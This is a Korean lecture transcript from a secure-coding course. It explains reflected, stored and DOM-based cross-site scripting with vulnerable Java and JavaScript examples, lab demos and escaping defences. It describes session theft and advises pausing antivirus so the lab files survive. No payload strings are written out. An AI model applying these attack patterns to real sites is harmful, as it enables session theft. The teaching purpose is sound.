[7주차 2차시 06:25] 이처럼 크로스사이트 스크린팅 공격은 사용자뿐만 아니라 서비스를 운영하고 있는 기업에도 [불명확 U0010]
[7주차 2차시 06:31] 이미지 실추와 금전적 손실을 일으킬 수 있기 때문에 무엇보다 초기에 예방하는 것이 매우 중요합니다.
[7주차 2차시 06:44] 다음으로는 크로스사이트 스크립팅 취약점의 유형별 모습을 통해 코드를 한번 진단을 해보도록 하겠습니다.
[7주차 2차시 06:55] 그래서 Reflected Cross-Site Scripting 공격, 우리말로 반사형이라 부르는 크로스사이트 스크립팅의 전체 흐름을 따라가 보도록 하겠습니다.
[7주차 2차시 07:07] 먼저 공격자는 게시판이나 데클 같은 자주 방문하는 공간이나 피싱 메일을 통해서 사용자가 클릭하게끔 악성 코드가 포함된 URL을 뿌립니다. [불명확 U0011]
[7주차 2차시 07:18] 사용자가 해당 링크를 모르고 클릭을 하게 되면, 예를 들어 a.com이라는 웹사이트에 1.do라는 애플리케이션으로 접속을 하게 됩니다. [불명확 U0012]
[7주차 2차시 07:32] 이때 주소창 URL 안에는 이름 파라미터에 스크립트 코드가 들어가 있는데요. [불명확 U0013]
[7주차 2차시 07:40] [추가 발화 후보 E0001 · 불명확] 이 부분입니다.
[7주차 2차시 07:46] 그런데 이 외에 애플리케이션이 그 값을 검증 없이 그대로 화면에 출력을 한다면 [불명확 U0014]
[7주차 2차시 07:51] 사용자 브라우저에서 악성 코드가 바로 실행이 됩니다.
[7주차 2차시 08:02] 결과적으로 사용자의 쿠키 정보나 로그인 세션이 탈취되거나 브라우저가 원하지 않는 명령을 수행하게 되는 심각한 보안사고로 이어질 수가 있습니다.
[7주차 2차시 08:19] 이번에는 Reflected Cross-Site Scripting의 취약한 코드 사례를 한번 살펴보도록 하겠습니다.
[7주차 2차시 08:27] 먼저 위쪽 코드를 보면 id 파라미터 값을 받아서
[7주차 2차시 08:31] 여기 get 파라미터 id 여기 부분이죠. [불명확 U0015]
[7주차 2차시 08:35] 커스텀 id 변수에 그대로 대입한 다음 [불명확 U0016]
[7주차 2차시 08:38] 곧바로 html 안에 이런 식으로 넣도록 되어 있습니다.
[7주차 2차시 08:46] 이런 방식은 서버 사이드 렌더링 방식인데요.
[7주차 2차시 08:49] id로 전달된 값이 검증이나 필터링 없이 문서 중간에 삽입되었기 때문에
[7주차 2차시 08:55] 이를 받은 클라이언트 브라우저에서는 원래 HTML 안에 포함된 스크립트로 인식하고 바로 실행하게 됩니다.
[7주차 2차시 09:05] 아래쪽 코드는 Java Sublet 코드 예시인데요. [불명확 U0017]
[7주차 2차시 09:09] 여기서는 Q라는 파라미터를 받아서 Rightln 함수로 곧바로 화면에 출력을 하고 있죠. [불명확 U0018]
[7주차 2차시 09:20] 이 역시 HTML 문서를 동적으로 생성하던 중 바디 부분에 그대로 출력되기 때문에 브라우저는 이것도 정상적인 문서에 들어있던 스크립트로 오해하고 실행시켜 버립니다. [불명확 U0019]
[7주차 2차시 09:35] 결과적으로 사용자 입력을 검증하지 않고 HTML에 반영하는 방식은 매우 위험하며 이런 구조에서는 악성 스크립트 삽입에 너무나 쉽게 노출될 수가 있습니다.
[7주차 2차시 09:50] 그럼 이번에는 Reflected Cross-Site Scripting 공격의 시연 영상 한번 보도록 하겠습니다. [불명확 U0020]
[7주차 2차시 10:02] 앞서 저희가 설치해 두었던 랩 환경을 활용하면
[7주차 2차시 10:05] Cross-Site Scripting 공격의 여러 종류를 직접 시험해 볼 수가 있습니다.
[7주차 2차시 10:11] 우선 랩 파일들이 설치되어 있는 C드라이브의 Secure Coding 2025 폴더로 들어가겠습니다.
[7주차 2차시 10:18] 명령어 창에 스타트 랩을 입력하면 먼저 데이터베이스가 시작이 되고, 그 다음 스프링 부트가 실행이 되죠.
[7주차 2차시 10:28] 여기서 먼저 해야 할 작업은 프로젝트의 메이븐 업데이트를 수행하는 것입니다.
[7주차 2차시 10:33] 다만 랩 소스 코드 안에서는 스크립트 공격을 실습하기 위한 악성 코드처럼 보이는 내용이 포함되어 있다 보니,
[7주차 2차시 10:42] 윈도우즈 디펜더나 백신 프로그램에서 경고 메시지를 보여줄 수가 있습니다.
[7주차 2차시 10:48] 이럴 땐 경고를 무시하고 진행해도 괜찮고
[7주차 2차시 10:52] 혹시 사용하는 백신이 해당 파일을 강제로 삭제해버리는 경우가 있다면
[7주차 2차시 10:56] 백신을 일시 중지한 후 실습을 진행하는 것이 좋습니다.
[7주차 2차시 11:03] 디펜던시 확인과 빌드가 완료되었으면
[7주차 2차시 11:05] 이제 Spring Boot 애플리케이션으로 실행해보도록 하겠습니다. [불명확 U0021]
[7주차 2차시 11:10] 실행이 완료되면 콘솔 창에서 8000번 포트로
[7주차 2차시 11:13] 리슨 중이라는 로그 메시지가 하단에 보이고요.
[7주차 2차시 11:17] 그럼 이제 브라우저를 열고 주소창 로크로스트에 8000번 포트를 입력을 해서 접속을 하겠습니다. [불명확 U0022]
[7주차 2차시 11:26] 로그인 창에서 아이디는 테스트, 비밀번호는 qqq111을 입력하여 로그인을 하고요. [불명확 U0023]
[7주차 2차시 11:34] 로그인에 성공하면 시키어 코딩 테스트 메뉴가 보이는데요. [불명확 U0024]
[7주차 2차시 11:39] 그 중에서 입력값 검증 항목으로 들어가면 크로사이트 스크립팅 실습 메뉴가 있습니다.
[7주차 2차시 11:46] 그럼 먼저 Reflected 방식의 크로사이트 스크립팅을 시험을 해보겠습니다.
[7주차 2차시 11:53] 실행에 앞서 먼저 관련 소스 코드를 간단하게 확인을 하고 오겠습니다. [불명확 U0025]
[7주차 2차시 11:58] 소스 탐색기에서 source.java 경로를 따라 들어가면 [불명확 U0026]
[7주차 2차시 12:02] opening.lab.test.controller 패키지 있고 [불명확 U0027]
[7주차 2차시 12:06] 그 안에 있는 cross-site script test xss-test-controller.java 파일을 찾을 수가 있을 텐데요. [불명확 U0028]
[7주차 2차시 12:24] 이 부분이 바로 리플렉티드 방식의 테스트 코드입니다.
[7주차 2차시 12:29] 코드를 보면 리퀘스트로부터 데이터라는 이름의 파라미터 값을 가져와서
[7주차 2차시 12:34] 스프링 버퍼에 덧붙인 다음에 클라이언트에게 곧바로 리턴하고 있는 구조입니다. [불명확 U0029]
[7주차 2차시 12:42] 즉 사용자 입력값이 필터링 없이 그대로 응답에 포함되는 상황이죠.
[7주차 2차시 12:48] 이건 크로스사이트 스크립팅 공격에 매우 취약한 구조입니다.
[7주차 2차시 12:53] 그럼 아래에 있는 스크립트 입력 예시를 복사해서 테스트 한번 해보겠습니다.
[7주차 2차시 12:59] 스크립트 태그가 포함된 코드를 복사한 다음에
[7주차 2차시 13:03] 브라우저로 돌아와서 입력 칸에 붙여놓고 실행 버튼을 눌러보면
[7주차 2차시 13:07] 스크립트가 실행되면서 경고창이 나타나는 것을 확인할 수가 있습니다.
[7주차 2차시 13:13] 이처럼 사용자 입력 값을 검증 없이 응답에 그대로 사용하게 되면
[7주차 2차시 13:17] Reflected Cross-Site Scripting 취약점이 실제로 발생을 하게 되고요. [불명확 U0030]
[7주차 2차시 13:25] 이번에 살펴볼 공격 유형은
[7주차 2차시 13:28] 스토어드 크로스사이트 스크립팅, 우리말로는 저장형 크로스사이트 스크립팅입니다.
[7주차 2차시 13:34] 이 공격은 이름에서 알 수 있듯이 스크립트가 서버의 데이터베이스에 저장되어 있는 형태로 공격이 이루어지는 방식입니다. [불명확 U0031]
[7주차 2차시 13:46] 주로 게시판, 블로그, SNS, 댓글처럼 사용자 입력을 저장해두는 기능이 있는 경우에 발생할 수 있는데요.
[7주차 2차시 13:56] 공격자가 글을 작성하거나 댓글을 달면서 스크립트 태그, 즉 스크립트 실행 코드를 콘텐츠 안에 몰래 심어두는 것입니다.
[7주차 2차시 14:06] 예시 화면을 보면 스크립트 안에 사용자 쿠키 값을 해커가 준비해놓은 사이트로 전송하는 악성 코드가 들어가 있습니다.
[7주차 2차시 14:20] 이 스크립트죠.
[7주차 2차시 14:25] 요거를 이제 글을 등록을 하고 이 콘텐츠가 별다른 방 없이 그대로 저장이 되고 [불명확 U0032]
[7주차 2차시 14:31] 다른 일반 사용자가 이 글을 보기만 해도 이 글이 데이터베이스에 저장이 되고
[7주차 2차시 14:41] 공격자가 이 글을 열람하기만 해도 스크립트가 자동으로 실행되면서
[7주차 2차시 14:46] 세션 탈취나 피싱 사이트로 이동하는 피해가 발생할 수가 있습니다.
[7주차 2차시 14:55] Reflected 방식이 일회성 공격이라면, Stored 방식은 단 한 번만 성공해도 게시글이 존재하는 동안 계속해서 피해가 발생한다는 점에서 훨씬 더 위험합니다.
[7주차 2차시 15:09] 따라서 사용자 입력 값을 저장하기 전에 반드시 철저한 검증과 필터링이 필요하며, 출력 시에도 안전하게 처리해야 하는 이유가 여기에 있습니다. [불명확 U0033]
[7주차 2차시 15:23] [추가 발화 후보 E0002 · 불명확] 이 소스 코드는 얼핏 보면
[7주차 2차시 15:24] 다음은 취약한 소스 코드를 살펴보도록 하겠습니다. [불명확 U0034]
[7주차 2차시 15:35] 이 코드는 얼핏 보면 Prepare Statement를 사용하고 있기 때문에 [불명확 U0035]
[7주차 2차시 15:40] SQL Injection 취약점은 방어를 하고 있는 안전한 코드처럼 보입니다. [불명확 U0036]
[7주차 2차시 15:48] [추가 발화 후보 E0003 · 불명확] 여기 보면 이렇게, 그죠?
[7주차 2차시 15:53] 하지만 크로스 사이트 스크립팅 관점에서 본다면 이야기가 달라지는데요.
[7주차 2차시 15:58] 왜냐하면 데이터베이스에서 가져온 결과 값에 악성 스크립트가 들어있는 경우에 그 내용을 그대로 웹페이지에 출력을 하게 되면
[7주차 2차시 16:08] 사용자 브라우저에서 스크립트가 실행되어 크로스 사이트 스크립팅 공격이 발생할 수 있기 때문입니다.
[7주차 2차시 16:17] 즉 쿼리 자체가 안전하더라도 입력된 데이터가 어떤 내용인지 그리고 어떻게 화면에 보여질지를 고려하지 않는다면 여전히 위험할 수 있는 코드입니다.
[7주차 2차시 16:29] 따라서 데이터베이스에서 값을 꺼내기 전에 또는 출력 직전에도 반드시 검증과 필터링을 수행하는 것이 가장 안전한 방법이라고 할 수 있겠습니다.
[7주차 2차시 16:47] 이번에는 스토워드 크로스 사이트 스크립팅 한번 실습해 보도록 하겠습니다
[7주차 2차시 17:00] 먼저 또 소스 코드부터 간단히 살펴보면 그 같은 위치에 이제 있는데요
[7주차 2차시 17:08] 사용자 요청을 리퀘스트 객체로 받아오고 있고
[7주차 2차시 17:13] 실제 운영 환경이라면 이 요청값이 데이터베이스에 저장된 게시글로 처리가 되겠지만
[7주차 2차시 17:18] 이번 실습에서는 가상의 데이터베이스로 해시맵 구조를 사용하고 있습니다.
[7주차 2차시 17:27] 키값 1번에는 경고창을 띄워 크로사이트 스크립팅을 보여주는 스크립트 구분을 넣고 있는데요. [불명확 U0037]
[7주차 2차시 17:34] 필터링이나 정제 과정 없이 저장된 글이라고 가정하는 상황입니다.
[7주차 2차시 17:40] 반면에 키값 2번에는 같은 스크립트 내용이지만
[7주차 2차시 17:43] HTML 인포딩 과정을 거쳐 정제된 형태로 저장된 상태입니다. [불명확 U0038]
[7주차 2차시 17:50] 이건 필터링이 잘 된 상황을 가정한 예시입니다.
[7주차 2차시 17:54] 그리고 코드 아래쪽을 보면 사용자가 입력한 값이 1인지 2인지에 따라서
[7주차 2차시 18:00] 해시맵에 대응되는 데이터를 가져와서 버퍼에 붙여서 화면에 출력하는 방식입니다. [불명확 U0039]
[7주차 2차시 18:07] 그래서 이 브라우저에 돌아가서 한번 입력을 해 볼게요
[7주차 2차시 18:11] 그래서 1번 글 조회를 해 보겠습니다
[7주차 2차시 18:15] 이건 이제 스크립트가 코드가 그대로 저장돼 있는 상황이고요
[7주차 2차시 18:19] 실행을 하면 경고창이 뜨죠 [불명확 U0040]
[7주차 2차시 18:25] 그리고 2번 글을 조회를 해 보면 [불명확 U0041]
[7주차 2차시 18:29] 이건 정제 과정을 거쳐 저장된 상태였죠
[7주차 2차시 18:32] 그래서 눌러보면 스크립트가 실행되지 않고
[7주차 2차시 18:37] 문자 그대로 화면에 보여주고 있습니다 그래서 이처럼 크로스 사이트 스크립팅 공격은 한번 성공하면 [불명확 U0042]
[7주차 2차시 18:47] 그 스크립트가 보관된 글을
[7주차 2차시 18:52] 보는 모든 사용자에게
[7주차 2차시 18:57] 반복적으로 피해를 입힐 수 있기 때문에 반드시 저장 이전이나 출력 직전에 필터링을 적용해야 한다는 점을
[7주차 2차시 19:07] 명심해야겠습니다. [불명확 U0043]
[7주차 2차시 19:13] 이번에는 DOM 기반 크로스 사이트 스크립팅, 우리말로는 문서 객체 모델 기반 크로스 사이트 스크립팅 공격에 대해 알아보도록 하겠습니다.
[7주차 2차시 19:25] 예시 상황을 한번 마찬가지로 살펴보면, 공격자는 먼저 사용자가 1번, 2번 과정을 통해
[7주차 2차시 19:36] 로그인한 이후에 접근할 수 있는 요청 처리함이라는 특정 페이지를 알아냅니다.
[7주차 2차시 19:42] 이 페이지는 주소창에 메뉴라는 이름의 파라미터를 포함하고 있고, 그 값이 화면에 그대로 표시된다는 사실을 파악합니다.
[7주차 2차시 19:54] 이걸 알아낸 공격자는 메뉴 파라미터에 악성 스크립트를 심은 주소를 만들어 피싱메일이나 메신저 등을 통해 사용자에게 전달합니다.
[7주차 2차시 20:05] 사용자가 이미 로그인한 상태에서 이 주소를 클릭을 하게 되면 서버는 정상적인 HTML 문서를 응답해 주지만 문제는 클라이언트 쪽 자바스크립트입니다.
[7주차 2차시 20:21] 화면을 구성하는 과정에서 파라미터 내용을 DOM 조작을 통해 직접 화면에 출력하게 되어 있다면
[7주차 2차시 20:38] 그 시점에 악성코드가 실행이 되면서 쿠키나 세션 같은 민감한 정보가 유출될 수 있습니다. [불명확 U0044]
[7주차 2차시 20:47] 이 공격은 꼭 파라미터가 아니더라도 주소창 뒤에 샵 기호로 표시되는 프레그먼트 아이디 값을 활용해서도 가능합니다.
[7주차 2차시 20:56] 샵 기호 뒤에 값은 서버로 전송되지 않기 때문에 서버 로그에는 남지 않고 브라우저 내에서만 동작하는 공격이기 때문에 탐지하기도 어렵습니다.
[7주차 2차시 21:09] 이런 형태의 취약점은 서버 응답은 아무 문제가 없지만
[7주차 2차시 21:12] 클라이언트에서 발생하는 것이기 때문에
[7주차 2차시 21:15] DOM 조작을 많이 사용하는 프론트엔드 프레임워크에서는
[7주차 2차시 21:20] 특히 각별한 주의가 필요합니다.
[7주차 2차시 21:29] DOM 기반 프로사이트 스크립팅이 실제 코드에서 어떻게 동작하는지 [불명확 U0045]
[7주차 2차시 21:34] 예시 코드를 한번 살펴보도록 하겠습니다.
[7주차 2차시 21:39] 화면 상단 코드를 보면 먼저 문서 주소값이 [불명확 U0046]
[7주차 2차시 21:45] 문서 주소값이 document.url이 변수 a에 저장하고 [불명확 U0047]
[7주차 2차시 21:57] 그 다음에 이제 decode uri 컴포넌트 함수를 통해서 [불명확 U0048]
[7주차 2차시 22:05] URL 인코딩되어 있던 내용을 디코딩을 하죠.
[7주차 2차시 22:13] 그리고 document.write 함수를 통해
[7주차 2차시 22:17] 파라미터로 전달된 메시지 내용이 HTML 문서에 바로 삽입되도록 되어 있습니다.
[7주차 2차시 22:26] 이 상황에서 사용자가 주소창에 특정한 값을 넣어 접속을 하면
[7주차 2차시 22:31] 그 값이 디코딩된 화면에 그대로 출력되는 구조가 됩니다.
[7주차 2차시 22:38] 만약 공격자가 이 주소에 스크립트 태그가 포함된 악성 문자열을 넣는다면 [불명확 U0049]
[7주차 2차시 22:42] DOM 문서에 그대로 삽입되어 파싱이 일어나고
[7주차 2차시 22:48] 이 과정에서 악성 코드가 실행됩니다.
[7주차 2차시 22:52] 이건 왜 위험하냐면 화면을 구성하는 문서 객체 모델
[7주차 2차시 22:55] 즉 DOM을 조작하기 전에
[7주차 2차시 22:58] 입력값에 대한 필터링이나 정제작업을 하지 않았기 때문입니다.
[7주차 2차시 23:03] 이런 식으로 실행되는 공격은 서버에 기록이 남지 않고
[7주차 2차시 23:07] 모든 동작이 클라이언트 쪽에서 일어나기 때문에
[7주차 2차시 23:10] 탐지나 추적이 매우 어렵습니다.
[7주차 2차시 23:16] 이번에는 DOM 기반 크로스사이트 스크립팅 한번 실습해 보도록 하겠습니다.
[7주차 2차시 23:27] 이건 역시 소스코드가 어떻게 되어 있는지부터 한번 살펴볼게요.
[7주차 2차시 23:33] 컨트롤러 소스코드에서 일단 이 부분에 해당이 되고요.
[7주차 2차시 23:38] 클라이언트에서 서브밋을 하면 리퀘스트 객체로부터 파라미터 값으로 전달이 됩니다.
[7주차 2차시 23:44] 여기에서 replaceAll이라는 함수를 호출을 해서 열쇠 닫는 꺽쇠 기호를 HTML 인코딩된 형태로 변환을 하고 있고요. [불명확 U0050]
[7주차 2차시 23:54] 아주 정교한 정제는 아니지만 일단 서버에서 태그 같은 코드가 들어오는 걸 간단히 막는 처리이죠.
[7주차 2차시 24:02] 그런데 이 코드에서는 응답을 보낼 때 리디렉트를 하게 되어 있습니다.
[7주차 2차시 24:08] 도움 XSS 명령 페이지로 이동하라는 건데요. [불명확 U0051]
[7주차 2차시 24:12] 앞에서 정제된 데이터가 GET 방식으로 전달되도록 되어 있습니다.
[7주차 2차시 24:18] 즉 사용자가 요청을 보낸 뒤 새로운 HTML 페이지로 이동하게 되는 방식입니다.
[7주차 2차시 24:24] 이 페이지는 서버에서 렌더링 되는 게 아니라 그냥 클라이언트에게 보내주는 정적인 HTML 문서입니다.
[7주차 2차시 24:33] 그럼 이 내용을 직접 확인하기 위해 resources 디렉터리로 이동을 해보겠습니다.
[7주차 2차시 24:39] 그 안에 템플레이 폴더 안에 테스트 폴더 열면 DOMXSS HTML 파일이 있는 걸 볼 수가 있습니다. [불명확 U0052]
[7주차 2차시 24:49] 파일을 열어보면 화면 본문에는 전달된 파라미터 값을 확인하려면 이라는 글씨와
[7주차 2차시 24:55] 여기 라는 글씨를 클릭할 경우 onClickString 이라는 함수를 호출하도록 되어 있다는 것을 알 수가 있습니다. [불명확 U0053]
[7주차 2차시 25:03] 이 함수는 문서 상단에 선언이 되어 있는데요.
[7주차 2차시 25:10] uneascape를 통해 디코딩된 값을 가져와 메시지라는 파라미터에 해당하는 값을 꺼내고 [불명확 U0054]
[7주차 2차시 25:18] document 객체의 write 함수로 직접 출력을 하고 있습니다 즉 페이지는 서버는 손대지 않고
[7주차 2차시 25:28] 클라이언트 스크립트만으로 입력 값을 화면에 표시하는 구조입니다 그럼 브라우저에서 한번 해보겠습니다
[7주차 2차시 25:36] domx 여기 입력창에 스크립트 문장 alert 문장을 넣고 실행을 해서 눌러 보면 [불명확 U0055]
[7주차 2차시 25:46] 아까 봤던 html 페이지 내용 그대로 나타나는 것을 확인을 할 수가 있습니다. [불명확 U0056]
[7주차 2차시 25:59] 전달된 값을 보면 꺽새들이 잘 변환되어 있는 것을 확인할 수 있습니다. [불명확 U0057]
[7주차 2차시 26:09] 여기 버튼도 한번 눌러보도록 하겠습니다.
[7주차 2차시 26:11] 그러면 원래 코드에서 의도한 대로 문구가 표시되는 것도 확인할 수가 있고
[7주차 2차시 26:18] 그럼 이번에는 페이지가 한번 로드된 다음
[7주차 2차시 26:22] 주소창의 파라미터 부분을 조작을 해서
[7주차 2차시 26:25] 스크립트가 복원되도록 만들어 보도록 하겠습니다.
[7주차 2차시 26:30] 다시 여기를 클릭하면
[7주차 2차시 26:31] document.write로 삽입된 값이
[7주차 2차시 26:37] 스크립트로 동작해서 경고창이 실행되는 것을 볼 수가 있습니다.
[7주차 2차시 26:43] 즉 서버에서는 아무 계획도 하지 않았지만 브라우저 쪽 스크립트만으로도 크로스사이트 스크립팅 공격이 발생하는 구조라는 걸 확인할 수가 있습니다. [불명확 U0058]
[7주차 2차시 26:57] 이번에는 이러한 공격이 실제로 어떤 사고로 이어졌는지
[7주차 2차시 27:05] 2024년 3월에 기사화된 보안사고 사례를 통해 살펴보도록 하겠습니다.
[7주차 2차시 27:14] 먼저 공격자는 한 학원 홈페이지의 회원 계정을 해킹하기 위해서 다른 웹사이트에서 유출된 아이디와 비밀번호 조합을 가져와서 무차별 대입 공격, 즉 크리덴셜 스토핑 공격을 먼저 시도했고요. [불명확 U0059]
[7주차 2차시 27:33] 이 과정을 통해 실제로 로그인 가능한 계정 하나를 찾아내는데 성공을 합니다.
[7주차 2차시 27:41] 그 다음 관리자가 자주 보는 이슈 신고 게시판을 찾아내고
[7주차 2차시 27:46] 그곳에 허위 신고글을 작성을 하면서 악성 스크립트 코드를 함께 삽입을 합니다.
[7주차 2차시 27:53] 이건 우리가 앞서 살펴본 Sword X Cross-site Scripting [불명확 U0060]
[7주차 2차시 27:57] 즉 저장형 Cross-site Scripting 공격에 해당하는 방식이죠. [불명확 U0061]
[7주차 2차시 28:03] 관리자 몇 명이 글을 아무 의심 없이 열람을 하게 되면서 악성 스크립트가 자동으로 실행이 되고, 그 결과 관리자의 세션 정보가 공격자에게 전송됩니다.
[7주차 2차시 28:20] 공격자는 이렇게 가로챈 세션을 그대로 사용해 관리자 페이지에 진입을 했고, 최종적으로는 9만 5천명에 달하는 학생들의 개인정보를 유출시키는 심각한 보안사고로 이어졌습니다.
[7주차 2차시 28:36] 이 사건은 크루사이트 스크립트 팀 취약점이 단순한 장난이 아니라 대규모 정보 유출과 법적 책임, 기업 이미지 손상으로 이어질 수 있다는 것을 잘 보여준 사례입니다. [불명확 U0062]
[7주차 2차시 28:50] 그래서 크로스사이트 스크립팅은 단순한 팝업 띄우기가 아니고요. [불명확 U0063]
[7주차 2차시 28:56] 절대 가볍게 보아서는 안되고 모든 입력값에 대한 철저한 검증과 필터링, 그리고 시큐어 코딩 원칙의 실천이 반드시 필요합니다.
[7주차 2차시 29:11] 그럼 크로스사이트 스크립팅 취약점을 방어하는 내용에 대해서 살펴보도록 하겠습니다.
[7주차 2차시 29:20] 공격자가 악성 스크립트를 주입하려고 시도하는 가장 흔한 경로
[7주차 2차시 29:25] 바로 사용자 입력을 받는 부분인데요
[7주차 2차시 29:29] 그래서 우리는 항상 모든 사용자 입력 값에 대해 철저하게 제한을 걸어야 합니다
[7주차 2차시 29:36] 이때 중요한 점은 허용하면 안 되는 것을 골라내는 블랙리스트 방식이 아니라
[7주차 2차시 29:43] 기본적으로 전부 거부하고 허용된 형식만 통과시키는 화이트리스트 방식을 사용해야 한다는 것입니다.
[7주차 2차시 29:53] 이는 웹보안에서 가장 기본적이고 반복해서 강조되는 원칙이죠.
[7주차 2차시 29:58] 그런데 여기서 끝이 아니고, 실력되는 값, 그러니까 데이터베이스에서 꺼낸 화면에 보여지는 값도 주의를 해야 합니다. [불명확 U0064]
[7주차 2차시 30:09] 만약 알 수 없는 방법으로 데이터베이스 안에 악성 스크립트가 심어져 있다면 [불명확 U0065]
[7주차 2차시 30:14] 이를 아무 필터링 없이 화면에 표시할 경우
[7주차 2차시 30:18] 그 데이터를 보는 모든 사용자에게 악성 코드를 유통시키는 상황이 될 수 있습니다.
[7주차 2차시 30:26] 그래서 출력할 때도 스크립트가 실행되지 않도록
[7주차 2차시 30:29] 특수문자들을 HTML 엔티티 형태로 변환하여
[7주차 2차시 30:33] 단순 텍스트로만 보이도록 처리를 해야 합니다.
[7주차 2차시 30:38] 예를 들어 꺽쇠 기호, 엔드 기호, 큰 따옴표, 작은 따옴표 이런 것들은 [불명확 U0066]
[7주차 2차시 30:44] 모두 스크립트 실행에 악용될 수 있는 위험한 문자이기 때문에
[7주차 2차시 30:48] 특수 코드로 바꾸는 인코딩 작업이 반드시 필요합니다.
[7주차 2차시 30:58] 여기에 나와 있는 항목들은 입력 값에서 특히 조심해서 차단해야 하는 태그들입니다.
[7주차 2차시 31:05] 이 중에는 스크립트 코드를 직접 입력할 수 있는 태그도 있고
[7주차 2차시 31:10] 외부에서 자바스크립트 파일이나 이미지, 스타일 시트 같은 코드를 [불명확 U0067]
[7주차 2차시 31:15] 코드 파일을 끌어다가 삽입해주는 태그도 포함되어 있습니다. [불명확 U0068]
[7주차 2차시 31:21] 게다가 이런 태그들에는 onError, onClick, onMouseOver 같은 속성을 붙일 수가 있는데
[7주차 2차시 31:27] 이 속성들에는 자바스크립트 함수를 넣을 수 있기 때문에
[7주차 2차시 31:31] 특정 상황에서 악성코드가 자동으로 실행될 수 있는 위험이 있습니다.
[7주차 2차시 31:38] 그래서 특별한 기능을 위해 꼭 필요한 경우가 아니라면
[7주차 2차시 31:41] 이런 태그들은 전부 필터링을 해버리거나
[7주차 2차시 31:45] 안전하게 인코딩된 형태로 바꿔서 보여주는 게 기본적인 방어 방법입니다.
[7주차 2차시 31:56] 앞에서 이야기했던 출력값에 대한 필터링 처리
[7주차 2차시 32:00] 그 중에서도 HTML 인코딩에 대해서 한번 다시 정리해 보겠습니다.
[7주차 2차시 32:05] 이런 인코딩 작업을 다른 말로는 HTML 엔티티로 이스케이프 처리한다고 표현을 하는데요.
[7주차 2차시 32:12] 여기서 말하는 이스케이프 처리란, 특수문자들이 브라우저에서 태그나 코드로 잘못 해석되지 않도록 일반 텍스트로만 보여지도록 변환하는 과정입니다.
[7주차 2차시 32:25] 예를 들어 꺽쇠 기호나 큰 따옴뼈 같은 문자들은 스크립트나 태그로 오해를 받을 수 있기 때문에 특수한 문자로 코드로 바꿔서 전송해줘야 하는 겁니다. [불명확 U0069]
[7주차 2차시 32:36] 이 처리는 서버 쪽에서도 필요하고 클라이언트 쪽에서도 필요하기 때문에 출력 직전에 반드시 escape 처리를 적용해야 한다는 점 꼭 기억해 두시길 바랍니다.
[7주차 2차시 32:55] 현재 보시는 코드는 사용자가 입력한 값을 유저인풋이라는 변수에 저장하고
[7주차 2차시 33:02] DOM이라는 화면 구조에서 컨텐츠라는 아이디를 가진 요소를 찾아서
[7주차 2차시 33:09] 그 안에 내용을 유저인풋 값으로 바꿔주는 방식으로 작성이 되어 있습니다.
[7주차 2차시 33:15] 여기 보시면 [불명확 U0070]
[7주차 2차시 33:16] 겉보기에는 단순한 코드지만 이 구조에는 매우 큰 보안 취약점이 숨어져 있는데요
[7주차 2차시 33:27] 바로 입력 값을 아무런 검증 없이 그대로 html 문서에 넣어버리고 있다는 점입니다
[7주차 2차시 33:34] 이처럼 사용자 입력을 필터링 없이 화면에 반영을 하면
[7주차 2차시 33:38] 스크립트 태그 같은 악성 코드를 포함한 입력이 그대로 실행될 수 있어서
[7주차 2차시 33:44] 크로스 사이트 스크립팅 공격이 발생할 수가 있습니다.
[7주차 2차시 33:49] 따라서 입력 없이 화면에 보여질 때는 반드시 HTML escape 처리 [불명확 U0071]
[7주차 2차시 33:55] 즉 특수문자를 안전하게 변환하여 삽입해야 하고
[7주차 2차시 34:00] 자바스크립트로 DOM을 조작할 때도 절대로 innerHTML 같은 방식은 사용하면 안되겠습니다. [불명확 U0072]
[7주차 2차시 34:09] 지금부터는 이제 같은 기능을 수행하면서도 보안상 안전하게 구현한 코드로 한번 바꿔보도록 하겠습니다. [불명확 U0073]
[7주차 2차시 34:20] 방금 확인한 크로스 사이트 스크립팅 공격을 막기 위한 안전한 구현 방법을 소개해 보도록 하겠습니다. [불명확 U0074]
[7주차 2차시 34:26] [추가 발화 후보 · 반복 여부 및 구간 내 단어 시각 불명확 E0005 · 불명확] 공격을 막기 위한
[7주차 2차시 34:38] 우선 첫 번째 방법은 특수 문자를 안전하게 변환해주는 escape 처리 함수를 만들어서 사용하는 것입니다.
[7주차 2차시 34:46] 그래서 스크립트 태그나 꺽쇠 괄호처럼 문제가 될 수 있는 문자들을 [불명확 U0075]
[7주차 2차시 34:51] 이런 애들이죠.
[7주차 2차시 34:54] html 안에서 replace 함수로 일일이 찾아가지고 html에서 안전하게 출력될 수 있도록 변환해주는 방식입니다.
[7주차 2차시 35:06] 두 번째 방법은 더 간단하면서도 자주 권장되는 방식인데요.
[7주차 2차시 35:10] 사용자 입력 값에 HTML 태그가 들어갈 필요가 없다면
[7주차 2차시 35:15] 컨텐츠 요소의 내용을 바꿀 때 이너 HTML 속성이 아니라
[7주차 2차시 35:20] 텍스트 컨텐츠 속성의 값을 넣어주는 것이 좋습니다.
[7주차 2차시 35:26] [추가 발화 후보 E0004 · 불명확] 이런 식으로
[7주차 2차시 35:33] 이렇게 하면 입력값이 그저 화면에 표시만 될 뿐, 브라우저가 그 내용을 HTML 태그나 스크립트로 해석하지 않기 때문에 보다 손쉽게 크로스사이트 스크립팅 공격을 막을 수가 있습니다. [불명확 U0076]
[7주차 2차시 35:51] 지금 보시는 그림은 Spring Web Framework에서 사용자 입력 값을 어떻게 필터링하고 안전하게 출력할 수 있는지를 보여주는 흐름도입니다. [불명확 U0077]
[7주차 2차시 35:56] [추가 발화 후보 · 반복 여부 및 구간 내 단어 시각 불명확 E0006 · 불명확] Spring Web 프레임워크에서
[7주차 2차시 36:11] 이 그림은 앞서 필터를 만들어 볼 때도 잠깐 등장했던 내용인데요.
[7주차 2차시 36:17] 사용자의 요청은 필터, 인터셉터, 컨트롤러를 거쳐서 최종 비즈니스 로직에 전달이 되며, 응답도 이 반대 경로를 통해 사용자에게 전달이 됩니다. [불명확 U0078]
[7주차 2차시 36:31] 화살표를 따라가 보면 어느 지점에 어떻게 필터링 할 수 있는지 명확히 이해할 수가 있는데요.
[7주차 2차시 36:37] 입력 값의 경우에는 요청이 처음 들어오는 필터 단계에서 선제적으로 처리할 수도 있고,
[7주차 2차시 36:48] 인터셉터나 컨트롤러 단계에서 조건에 따라 유연하게 검증하거나 필터링 할 수도 있습니다.
[7주차 2차시 37:00] 출력값은 주로 컨트롤러에서 먼저 처리하거나 아예 뷰 단계에서 모든 출력은 이 두 군데에서 모든 출력값에 대해서 일괄적으로 escape 처리를 적용하는 방식도 가능하고
